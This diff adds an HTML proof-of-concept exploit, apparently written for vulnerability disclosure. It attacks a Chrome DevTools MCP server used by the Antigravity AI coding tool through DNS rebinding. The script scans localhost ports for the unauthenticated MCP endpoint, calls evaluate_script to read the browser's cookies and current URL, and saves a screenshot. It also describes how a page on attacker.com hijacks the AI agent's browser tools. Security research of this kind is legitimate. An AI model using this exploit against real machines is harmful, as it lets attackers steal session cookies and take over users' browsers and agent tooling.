@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+<head><title>CDT MCP DNS Rebinding POC</title></head>
+<body>
+<h2>Antigravity CDT MCP — DNS Rebinding POC</h2>
+<pre id="log"></pre>
+<script>
+// POC: DNS Rebinding attack against Antigravity CDT MCP server
+//
+// Attack flow:
+// 1. This page is served from attacker.com:{TARGET_PORT}
+// 2. DNS rebinds attacker.com -> 127.0.0.1
+// 3. fetch() to same origin hits CDT MCP (no CORS, same-origin)
+// 4. Attacker gets full browser control: evaluate_script, navigate, screenshot
+//
+// For testing: serve this on localhost to simulate post-rebind state
+
+const log = document.getElementById('log');
+function L(msg) { log.textContent += msg + '\n'; }
+
+async function mcpCall(port, method, params, id) {
+    const resp = await fetch(`http://127.0.0.1:${port}/mcp`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json, text/event-stream'
+        },
+        body: JSON.stringify({ jsonrpc: '2.0', method, params, id })
+    });
+    const text = await resp.text();
+    // Parse SSE response
+    const match = text.match(/data: (.+)/);
+    return match ? JSON.parse(match[1]) : null;
+}
+
+async function scanForMcp() {
+    // CDT MCP is on a random port. Scan likely range.
+    // Antigravity ports cluster around 62xxx based on observation.
+    const ranges = [
+        [62200, 62300],  // Primary range observed
+        [57100, 57200],  // Secondary range
+    ];
+
+    for (const [start, end] of ranges) {
+        for (let port = start; port <= end; port++) {
+            try {
+                const ctrl = new AbortController();
+                setTimeout(() => ctrl.abort(), 200);
+                const resp = await fetch(`http://127.0.0.1:${port}/mcp`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json, text/event-stream'
+                    },
+                    body: JSON.stringify({
+                        jsonrpc: '2.0', method: 'initialize',
+                        params: { protocolVersion: '2024-11-05', capabilities: {},
+                                  clientInfo: { name: 'scan', version: '1.0' } },
+                        id: 1
+                    }),
+                    signal: ctrl.signal
+                });
+                const text = await resp.text();
+                if (text.includes('chrome_devtools')) {
+                    L(`[!] CDT MCP found on port ${port}`);
+                    return port;
+                }
+            } catch(e) { /* port closed or timeout */ }
+        }
+    }
+    L('[-] CDT MCP not found in scanned range');
+    return null;
+}
+
+async function exploit(port) {
+    L(`\n[*] Connecting to CDT MCP on port ${port}...`);
+
+    // Step 1: Initialize
+    const init = await mcpCall(port, 'initialize', {
+        protocolVersion: '2024-11-05', capabilities: {},
+        clientInfo: { name: 'attacker', version: '1.0' }
+    }, 1);
+    L(`[+] Server: ${init?.result?.serverInfo?.name} v${init?.result?.serverInfo?.version}`);
+
+    // Step 2: List tools
+    const tools = await mcpCall(port, 'tools/list', {}, 2);
+    const toolNames = tools?.result?.tools?.map(t => t.name) || [];
+    L(`[+] Available tools: ${toolNames.join(', ')}`);
+
+    // Step 3: List browser pages (requires Chrome with debugging)
+    const pages = await mcpCall(port, 'tools/call', {
+        name: 'list_pages', arguments: {}
+    }, 3);
+    L(`[+] Browser pages: ${JSON.stringify(pages?.result?.content?.[0]?.text?.substring(0, 200))}`);
+
+    // Step 4: If Chrome is available, execute arbitrary JS
+    if (!pages?.result?.isError) {
+        const jsResult = await mcpCall(port, 'tools/call', {
+            name: 'evaluate_script',
+            arguments: {
+                script: 'document.cookie + " | " + window.location.href'
+            }
+        }, 4);
+        L(`[!] JS execution result: ${JSON.stringify(jsResult?.result?.content?.[0]?.text?.substring(0, 500))}`);
+
+        // Step 5: Save proof file
+        const ssResult = await mcpCall(port, 'tools/call', {
+            name: 'take_screenshot',
+            arguments: { filePath: '/tmp/dns-rebind-proof.png' }
+        }, 5);
+        L(`[+] Screenshot saved: ${JSON.stringify(ssResult?.result?.content?.[0]?.text?.substring(0, 200))}`);
+    } else {
+        L(`[*] Chrome not available — but server IS accessible (no auth)`);
+        L(`[*] Impact: When user activates browser agent, attacker gets full control`);
+    }
+}
+
+// In real attack: scan first, then exploit
+// For demo: use known port
+const KNOWN_PORT = 62258; // Replace with scan result
+L('[*] Antigravity CDT MCP DNS Rebinding POC');
+L('[*] In real attack: DNS rebinding makes this same-origin');
+L(`[*] Testing against port ${KNOWN_PORT}...`);
+exploit(KNOWN_PORT);
+</script>
+</body>
+</html>
